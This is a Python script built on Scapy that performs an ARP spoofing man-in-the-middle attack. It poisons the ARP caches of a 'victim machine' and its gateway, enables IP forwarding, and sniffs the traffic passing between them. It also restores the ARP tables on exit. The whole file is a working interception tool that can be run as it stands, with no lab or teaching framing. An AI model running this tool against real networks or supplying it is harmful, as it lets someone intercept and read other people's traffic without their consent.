from scapy.all import *
import time
import sys
import argparse
import os
import signal
import threading

def get_mac(ip):
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = srp(arp_request_broadcast, timeout=2, verbose=False)[0]

    if answered_list:
        return answered_list[0][1].hwsrc
    else:
        return None

def restore_arp(target_ip, target_mac, source_ip, source_mac):
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac,
                 psrc=source_ip, hwsrc=source_mac)
    send(packet, count=5, verbose=False)

def spoof(target_ip, target_mac, spoof_ip):
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=False)

def enable_ip_forwarding():
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

def disable_ip_forwarding():
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")

def signal_handler(sig, frame):
    print("\n[*] Detected CTRL+C! Restoring network...")
    restore_arp(target_ip, target_mac, gateway_ip, gateway_mac)
    restore_arp(gateway_ip, gateway_mac, target_ip, target_mac)
    disable_ip_forwarding()
    print("[*] ARP tables restored. Exiting.")
    sys.exit(0)

def packet_sniffer(packet):
    if packet.haslayer(IP):
        ip_layer = packet.getlayer(IP)
        print(f"[+] {ip_layer.src} -> {ip_layer.dst} | Proto: {ip_layer.proto}")

def arp_spoof_loop():
    while True:
        spoof(target_ip, target_mac, gateway_ip)
        spoof(gateway_ip, gateway_mac, target_ip)
        time.sleep(2)

parser = argparse.ArgumentParser(description="ARP Spoofer + MITM with Packet Sniffing")
parser.add_argument("target_ip", help="IP of the victim machine")
parser.add_argument("gateway_ip", help="IP of the gateway/router")

args = parser.parse_args()
target_ip = args.target_ip
gateway_ip = args.gateway_ip

print("[*] Getting MAC addresses...")
target_mac = get_mac(target_ip)
if target_mac is None:
    print(f"[!] Could not find MAC for target {target_ip}. Exiting.")
    sys.exit(1)

gateway_mac = get_mac(gateway_ip)
if gateway_mac is None:
    print(f"[!] Could not find MAC for gateway {gateway_ip}. Exiting.")
    sys.exit(1)

print(f"Target MAC: {target_mac}")
print(f"Gateway MAC: {gateway_mac}")

print("[*] Enabling IP forwarding...")
enable_ip_forwarding()

signal.signal(signal.SIGINT, signal_handler)

print("[*] Starting ARP spoofing and packet sniffing. Press CTRL+C to stop.")

# יצירת threads
thread_spoof = threading.Thread(target=arp_spoof_loop)
thread_sniff = threading.Thread(target=sniff, kwargs={
    "filter": f"ip host {target_ip} and ip host {gateway_ip}",
    "prn": packet_sniffer
})

thread_spoof.start()
thread_sniff.start()

thread_spoof.join()
thread_sniff.join()

